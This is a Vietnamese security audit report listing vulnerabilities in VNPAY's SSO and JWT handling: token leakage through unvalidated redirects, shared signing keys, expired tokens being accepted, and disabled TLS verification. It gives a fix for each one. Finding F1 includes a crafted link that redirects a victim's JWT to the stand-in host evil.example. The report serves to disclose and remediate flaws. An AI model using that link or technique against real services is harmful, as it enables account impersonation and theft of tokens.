# Phát hiện bảo mật trong các hệ thống VNPAY hiện có (cần chủ sở hữu xử lý)

Tìm thấy khi đọc mã tham chiếu để tích hợp đăng nhập desktop qua broker SSO `genai.vnpay.vn`. **Chưa kiểm thử trên hệ thống thật** (không thử trên production); nhận định dựa trên đọc mã, cần chủ sở hữu xác nhận.

## F1 — `create-jwt-token` không kiểm tra `connectid` → có thể chuyển JWT của nạn nhân tới máy chủ của kẻ tấn công (cao)
Nguồn: `VNE-GO/llm/main.go` — `CreateJWTTokenHandler` (dòng ~169-183) lưu `connectid` nguyên văn (chỉ kiểm tra khác rỗng); `SSOCallbackHandler` (dòng ~688) dựng
`redirectTarget := "http://localhost:" + jwtOutCallback + "/sso-callback?token=" + url.QueryEscape(jwtStr)` rồi chuyển hướng trình duyệt tới đó.

Vì `connectid` được nối thẳng sau `http://localhost:`, giá trị dạng `@evil.example/x` tạo URL `http://localhost:@evil.example/x/sso-callback?token=…` — phần `localhost:` trở thành *userinfo* và **host thật là `evil.example`**. Kịch bản: kẻ tấn công gửi link
`https://genai.vnpay.vn/create-jwt-token?connectid=%40evil.example%2Fx`; nạn nhân (đã có phiên SSO nên gần như không thấy gì) được chuyển hướng cùng JWT hợp lệ 24 giờ tới `evil.example`.
Hậu quả: JWT ký bằng `SharingKey` — cùng khóa mà `verify()` của các dịch vụ khác chấp nhận — nên kẻ tấn công có thể mạo danh nạn nhân ở mọi dịch vụ dùng khóa đó.

**Khắc phục (phía genai):** kiểm tra chặt `connectid` trước khi lưu, ví dụ `^\d{1,5}(/cb/[A-Za-z0-9_-]{16,64})?$` (cổng, tùy chọn kèm đường dẫn bí mật); dựng URL bằng `net/url` với host cố định `localhost`/`127.0.0.1` thay vì nối chuỗi; áp dụng cho cả `create-token`, `CLIAUTH`, `SSHAUTH` nếu có cùng cách nối. Nên thêm `Referrer-Policy: no-referrer` và bỏ `meta refresh` mang token.
TableDB desktop theo đúng giao thức hiện có của `antisw` (`connectid = <cổng>`). Tùy chọn `genaiSecretPath` (mặc định tắt) dùng `connectid = <cổng>/cb/<bí-mật>` để chống chèn token; chỉ bật khi regex phía genai cho phép dạng này.

## F2 — JWT ký đối xứng dùng chung (trung)
`buildVnpayJWT` ký HS256 bằng `SharingKey` (base64) — bất kỳ dịch vụ nào giữ khóa đều có thể **tạo** token hợp lệ cho bất kỳ người dùng. TableDB **không** giữ khóa này: API hỏi broker qua HTTPS (`GENAI_VERIFY_URL`). Đề nghị về dài hạn: ký bất đối xứng (RS256/ES256, JWKS), `aud` theo dịch vụ, thời hạn ngắn hơn 24 giờ.

## F3 — Callback loopback không có `state` (trung; ở ứng dụng tham chiếu `antisw`)
Listener nhận `/sso-callback?token=…` từ bất kỳ nguồn nào trên máy → kẻ tấn công (trang web/tiến trình khác) có thể nhét token của chính họ (đăng nhập nạn nhân vào tài khoản kẻ tấn công). TableDB mặc định giống `antisw` (không có state) nhưng kiểm tra Host, chỉ nhận một callback và API xác minh token với genai; có thể bật `genaiSecretPath` để chống chèn token hoàn toàn.

## F4 — Xác thực token qua HTTP thuần (trung; `antisw`)
`http://gravityland.vnoffice.io.vn/verify/me` gửi Bearer token không mã hóa. Dùng HTTPS.

## F5 — Khóa HMAC nằm trong mã phía client (trung; `antisw/src/pages/Accounts.tsx` dòng 143)
`apiKey = "fF74A…"` dùng để ký `auth-cli` nằm trong bundle giao diện, ai cũng đọc được → chữ ký không chứng minh gì. Coi khóa này đã lộ, đổi và thiết kế lại (chữ ký phải do máy chủ cấp).

## F7 — `verify/me` của antisw không thực sự xác minh gì (cao; `antisw/src-tauri/src/modules/oauth_server.rs`)
Ứng dụng gọi `GET http://gravityland.vnoffice.io.vn/verify/me` và coi `status.is_success()` là hợp lệ. Thử từ máy dev với token giả `aaaa.bbbb.cccc`: bản `http://` trả 301 sang `https://`, bản `https://` trả **200 và một trang HTML** (giao diện web), vì vậy sau khi theo redirect mọi token đều "hợp lệ". Ứng dụng đó thực chất đang chấp nhận bất kỳ chuỗi nào trong `?token=`. TableDB **không** dùng endpoint này: API kiểm chữ ký HS256 cục bộ (`GENAI_JWT_KEY`) hoặc chỉ chấp nhận câu trả lời `application/json`.

## F8 — `verify()` chấp nhận token HẾT HẠN và có thể panic (cao; `VNE-GO/llm/verichain.go`)
Trong `verify()`, nhánh `errors.Is(err, jwt.ErrTokenExpired) || errors.Is(err, jwt.ErrTokenNotValidYet)` chỉ ghi log "Timing is everything" rồi **chạy tiếp và chấp nhận token** (không `return false`), nên JWT hết hạn (24 giờ) vẫn dùng được mãi mãi ở mọi gateway dùng `verify()`. Ngoài ra `claims["sub"].(string)` ép kiểu không kiểm tra → `sub` thiếu hoặc không phải chuỗi gây panic. `jwt.Parse` cũng không ghim thuật toán (`WithValidMethods`).
**Đã làm:** endpoint mới `GET /verify/me` dùng hàm `verifyJWTStrict` riêng (ghim HS256, bắt buộc `exp`, từ chối hết hạn, không panic, từ chối API key). **Chưa sửa `verify()`** vì có thể có client đang dựa vào hành vi cũ — chủ sở hữu genai nên sửa (thêm `return false, nil` ở nhánh hết hạn, kiểm kiểu `sub`, thêm `WithValidMethods`) và kiểm tra tác động.

## F6 — `InsecureSkipVerify: true` khi gọi realm/token/HRM (trung; `VNE-GO/llm/main.go` dòng ~71, ~402, ~580)
Tắt kiểm tra chứng chỉ TLS cho các cuộc gọi tới Keycloak và HRM → có thể bị man-in-the-middle ở phía máy chủ. Cấu hình CA nội bộ thay vì tắt kiểm tra.
